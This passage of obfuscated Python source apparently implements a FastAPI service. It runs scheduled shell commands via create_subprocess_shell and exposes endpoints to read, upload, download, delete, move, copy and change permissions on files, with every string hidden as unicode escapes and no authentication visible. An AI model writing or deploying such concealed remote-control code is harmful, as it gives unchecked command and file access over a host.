                        Logger.info(codecs.decode('\\u23f0\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0054\\u0072\\u0069\\u0067\\u0067\\u0065\\u0072\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_986) + codecs.decode('\\u0020\\u2192\\u0020', 'unicode_escape') + str(O0_var_987[:50]) + codecs.decode('\\u002e\\u002e\\u002e\\u0020\\u0028\\u004c\\u0061\\u0067\\u003a\\u0020', 'unicode_escape') + format(O0_var_990, codecs.decode('\\u002e\\u0032\\u0066', 'unicode_escape')) + codecs.decode('\\u0073\\u0029', 'unicode_escape'))
                    O0_var_994 = await asyncio.create_subprocess_shell(O0_var_987, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, stdin=asyncio.subprocess.DEVNULL)
                    try:
                        O0_var_995, O0_var_996 = await asyncio.wait_for(O0_var_994.communicate(), timeout=self.timeout)
                        O0_var_997 = O0_var_995.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))[:2000]
                        O0_var_998 = O0_var_994.returncode
                    except asyncio.TimeoutError:
                        try:
                            O0_var_994.kill()
                        except:
                            pass
                        O0_var_997 = codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d', 'unicode_escape')
                        O0_var_998 = 124
                    except Exception as inner_e:
                        O0_var_997 = codecs.decode('\\u005b\\u0052\\u0055\\u004e\\u0054\\u0049\\u004d\\u0045\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(inner_e))
                        O0_var_998 = -1
                    O0_var_999 = self._format_log_entry(O0_var_987, O0_var_997, O0_var_998, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_986)
                    Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_999, self.max_log_size)
                    self._executed_crons.add(O0_var_993)
                    asyncio.get_event_loop().call_later(120, self._executed_crons.discard, O0_var_993)
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u0053\\u0063\\u0068\\u0065\\u0064\\u0075\\u006c\\u0065\\u0072\\u0020\\u0045\\u0072\\u0072\\u006f\\u0072\\u0020\\u0066\\u006f\\u0072\\u0020\\u0027', 'unicode_escape') + str(O0_var_986) + codecs.decode('\\u0027\\u003a\\u0020', 'unicode_escape') + str(e))
                O0_var_997 = codecs.decode('\\u005b\\u0053\\u0043\\u0048\\u0045\\u0044\\u0055\\u004c\\u0045\\u0052\\u005f\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(str(e))
                O0_var_999 = self._format_log_entry(O0_var_987, O0_var_997, -1, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), O0_var_986)
                Config.crontasks_log = self._append_task_log(Config.crontasks_log, O0_var_999, self.max_log_size)

    def get_onetime_log(self, O0_var_1000: int=None) -> list:
        O0_var_1001 = list(Config.onetimetasks_log)
        if O0_var_1000 and O0_var_1000 > 0:
            return O0_var_1001[-O0_var_1000:]
        return O0_var_1001

    def get_cron_log(self, O0_var_1002: int=None) -> list:
        O0_var_1003 = list(Config.crontasks_log)
        if O0_var_1002 and O0_var_1002 > 0:
            return O0_var_1003[-O0_var_1002:]
        return O0_var_1003

    def clear_logs(self, O0_var_1004: str=codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')):
        if O0_var_1004 in [codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.onetimetasks_log.clear()
        if O0_var_1004 in [codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape')]:
            Config.crontasks_log.clear()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006c\\u0065\\u0061\\u0072\\u0065\\u0064', 'unicode_escape'): O0_var_1004}

    def set_cron_tasks(self, O0_var_1005: Dict[str, str]) -> dict:
        O0_var_1006 = []
        for O0_var_1007 in O0_var_1005.keys():
            try:
                croniter(O0_var_1007, datetime.now())
            except Exception:
                O0_var_1006.append(O0_var_1007)
        if O0_var_1006:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u0072\\u006f\\u006e\\u0020\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_1006), codecs.decode('\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_1005) - len(O0_var_1006)}
        Config.crontasks = O0_var_1005 if O0_var_1005 else {}
        if Config.crontasks and (not Config.cronloop):
            self.start_cron_loop()
        elif not Config.crontasks and Config.cronloop:
            self.stop_cron_loop()
        O0_var_1008 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}
        O0_var_1008[codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape')] = self.store.save(Config.onetasks, Config.crontasks)
        return O0_var_1008

    def get_cron_tasks(self) -> dict:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): Config.crontasks}

    def start_cron_loop(self):
        if Config.cronloop and self._running:
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0072\\u0075\\u006e\\u006e\\u0069\\u006e\\u0067', 'unicode_escape')}
        Config.cronloop = True
        self._running = True
        self._executed_crons.clear()
        try:
            O0_var_1009 = asyncio.get_event_loop()
            self._cron_task = O0_var_1009.create_task(self._cron_loop_worker())
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        except RuntimeError:
            import threading
            O0_var_1010 = threading.Thread(target=self._run_cron_sync, daemon=True)
            O0_var_1010.start()
            if Config.DEBUG:
                Logger.info(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064\\u0020\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u002c\\u0020\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c\\u003d', 'unicode_escape') + str(self.check_interval) + codecs.decode('\\u0073', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u0061\\u0072\\u0074\\u0065\\u0064', 'unicode_escape')}

    def stop_cron_loop(self):
        Config.cronloop = False
        self._running = False
        if self._cron_task:
            self._cron_task.cancel()
            self._cron_task = None
        if Config.DEBUG:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u006c\\u006f\\u006f\\u0070\\u0020\\u0073\\u0074\\u006f\\u0070\\u0070\\u0065\\u0064', 'unicode_escape')}

    async def _cron_loop_worker(self):
        while self._running and Config.cronloop:
            try:
                await self._check_and_run_cron()
            except Exception as e:
                if Config.DEBUG:
                    Logger.error(codecs.decode('\\u274c\\u0020\\u005b\\u0043\\u0072\\u006f\\u006e\\u005d\\u0020\\u004c\\u006f\\u006f\\u0070\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(e))
            await asyncio.sleep(self.check_interval)

    def _run_cron_sync(self):
        import time
        while self._running and Config.cronloop:
            try:
                asyncio.run(self._check_and_run_cron())
            except:
                pass
            time.sleep(self.check_interval)

    @staticmethod
    def _append_task_log(log_list: deque, entry: dict, max_size: int=None):
        if max_size is None:
            max_size = Config.MAX_TASK_LOG_SIZE
        if not isinstance(log_list, deque):
            log_list = deque(log_list, maxlen=max_size)
        log_list.append(entry)
        return log_list

    @staticmethod
    def _format_log_entry(cmd: str, output: str, exitcode: int, task_type: str, cron_expr: str=None) -> dict:
        return {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat() + codecs.decode('\\u005a', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): cmd, codecs.decode('\\u006f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'): output, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exitcode, codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): task_type, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): cron_expr, codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0074\\u0065\\u0064', 'unicode_escape'): str(datetime.utcnow().isoformat()) + codecs.decode('\\u005a\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020', 'unicode_escape') + str(cmd) + codecs.decode('\\u0020\\u002d\\u002d\\u002d\\u002d\\u0020\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065\\u003d', 'unicode_escape') + str(exitcode) + codecs.decode('\\u000a', 'unicode_escape') + str(output.strip())}

    def get_status(self) -> dict:
        return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): {codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): Config.InitTask and len(Config.onetasks) > 0, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.onetasks)}, codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): {codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065', 'unicode_escape'): Config.cronloop, codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(Config.crontasks), codecs.decode('\\u0063\\u0068\\u0065\\u0063\\u006b\\u005f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0076\\u0061\\u006c', 'unicode_escape'): self.check_interval}, codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u006e\\u0063\\u0065', 'unicode_escape'): {codecs.decode('\\u0065\\u006e\\u0061\\u0062\\u006c\\u0065\\u0064', 'unicode_escape'): self.store.enabled, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065\\u005f\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self.store.path, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): self.store.last_saved_at}}

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), response_model=FileListResponse)
async def O0_fn_34(request: Request, body: FileListRequest=Body(...)):
    O0_var_1011 = request.app.state.file_manager
    O0_var_1012 = O0_var_1011.list_files(base_path=body.path, recursive=body.recursive)
    return O0_var_1012

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthorityQueryResponse)
async def O0_fn_35(request: Request, body: AuthorityQueryRequest=Body(...)):
    if not body.paths:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u003a', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): []})
    O0_var_1013 = request.app.state.file_manager
    O0_var_1014 = O0_var_1013.get_authority(body.paths)
    return O0_var_1014

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), response_model=AuthoritySetResponse)
async def O0_fn_36(request: Request, body: AuthoritySetRequest=Body(...)):
    O0_var_1015 = body.permissions
    O0_var_1016 = body.recursive
    if not O0_var_1015:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_1017 = request.app.state.file_manager
    O0_var_1018 = O0_var_1017.set_authority(O0_var_1015, O0_var_1016)
    return O0_var_1018

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0061\\u0074', 'unicode_escape'), response_model=FileCatResponse)
async def O0_fn_37(request: Request, body: FileCatRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): codecs.decode('', 'unicode_escape'), codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): False, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): 0})
    O0_var_1019 = request.app.state.file_manager
    O0_var_1020 = O0_var_1019.cat_file(body.path)
    return O0_var_1020

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileUploadResponse)
async def O0_fn_38(request: Request, body: FileUploadRequest=Body(...)):
    if not body.content:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u0020\\u0028\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    try:
        O0_var_1021 = base64.b64decode(body.content)
    except Exception:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): None, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): None, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): None, codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): None})
    O0_var_1022 = request.app.state.file_manager
    O0_var_1023 = O0_var_1022.upload_file(file_content=O0_var_1021, target_path=body.path, filename=body.filename, chunk_id=body.chunk_id, total_chunks=body.total_chunks)
    return O0_var_1023

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'), response_model=FileUploadRawResponse)
async def O0_fn_39(request: Request):
    O0_var_1024 = request.headers
    O0_var_1025 = unquote(O0_var_1024.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_1026 = unquote(O0_var_1024.get(codecs.decode('\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_1027 = O0_var_1024.get(codecs.decode('\\u0058\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u002d\\u0049\\u0064', 'unicode_escape'))
    O0_var_1028 = O0_var_1024.get(codecs.decode('\\u0058\\u002d\\u0054\\u006f\\u0074\\u0061\\u006c\\u002d\\u0043\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'))
    if not O0_var_1025 or not O0_var_1026:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0063\\u0075\\u0073\\u0074\\u006f\\u006d\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073\\u003a\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u0050\\u0061\\u0074\\u0068\\u0020\\u0061\\u006e\\u0064\\u0020\\u0058\\u002d\\u0046\\u0069\\u006c\\u0065\\u002d\\u004e\\u0061\\u006d\\u0065', 'unicode_escape'))
    O0_var_1029 = int(O0_var_1027) if O0_var_1027 is not None else None
    O0_var_1030 = int(O0_var_1028) if O0_var_1028 is not None else None
    O0_var_1031 = await request.body()
    O0_var_1032 = request.app.state.file_manager
    O0_var_1033 = O0_var_1032.upload_file(file_content=O0_var_1031, target_path=O0_var_1025, filename=O0_var_1026, chunk_id=O0_var_1029, total_chunks=O0_var_1030)
    if O0_var_1033.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u006f\\u006b', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=O0_var_1033.get(codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')), chunk_id=O0_var_1029, completed=True, message=codecs.decode('\\u0041\\u006c\\u006c\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073\\u0020\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064\\u002e\\u0020\\u0046\\u0069\\u006c\\u0065\\u0020\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape') if O0_var_1033.get(codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape')) else codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c\\u006c\\u0079\\u002e', 'unicode_escape'))
    elif O0_var_1033.get(codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')) == codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'):
        return FileUploadRawResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), path=os.path.join(O0_var_1025, O0_var_1026), chunk_id=O0_var_1029, completed=False, message=codecs.decode('\\u0043\\u0068\\u0075\\u006e\\u006b\\u0020', 'unicode_escape') + str(O0_var_1029) + codecs.decode('\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u002e\\u0020\\u0057\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u0020\\u0066\\u006f\\u0072\\u0020\\u0072\\u0065\\u006d\\u0061\\u0069\\u006e\\u0069\\u006e\\u0067\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0073\\u002e', 'unicode_escape'))
    return FileUploadRawResponse(status=codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), completed=False, message=O0_var_1033.get(codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('\\u0055\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
async def O0_fn_40(request: Request, body: FileDownloadRequest=Body(...)):
    if not body.path:
        return JSONResponse(400, {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_1034 = request.app.state.file_manager
    O0_var_1035, O0_var_1036, O0_var_1037 = O0_var_1034.download_file(body.path)
    from fastapi.responses import FileResponse
    return FileResponse(path=str(O0_var_1035), filename=O0_var_1035.name, media_type=O0_var_1036, headers={codecs.decode('\\u0078\\u002d\\u0066\\u0069\\u006c\\u0065\\u002d\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): str(O0_var_1037), codecs.decode('\\u0078\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0061\\u006c\\u002d\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_1035.relative_to(Path(Config.FILE_ROOT)))})

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileDeleteResponse)
async def O0_fn_41(request: Request, body: FileDeleteRequest=Body(...)):
    O0_var_1038 = body.paths
    if not O0_var_1038:
        O0_var_1039 = await request.body()
        O0_var_1040 = json.loads(O0_var_1039.decode()) if O0_var_1039 else {}
        O0_var_1038 = [O0_var_1042 for O0_var_1041 in [codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0032', 'unicode_escape'), codecs.decode('\\u0070\\u0031', 'unicode_escape'), codecs.decode('\\u0070\\u0032', 'unicode_escape')] if (O0_var_1042 := O0_var_1040.get(O0_var_1041))]
    if not O0_var_1038:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []})
    O0_var_1043 = request.app.state.file_manager
    O0_var_1044 = O0_var_1043.delete_paths(O0_var_1038)
    return O0_var_1044

@app.put(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), response_model=FileMoveResponse)
async def O0_fn_42(request: Request, move_map: Dict[str, str]=Body(..., examples={codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')})):
    if not move_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_1045 = request.app.state.file_manager
    O0_var_1046 = O0_var_1045.move_paths(move_map)
    return O0_var_1046

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0063\\u0070', 'unicode_escape'), response_model=FileMoveResponse)
async def O0_fn_43(request: Request, copy_map: Dict[str, str]=Body(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])):
    if not copy_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_1047 = request.app.state.file_manager
    O0_var_1048 = O0_var_1047.copy_paths(copy_map)
    return O0_var_1048

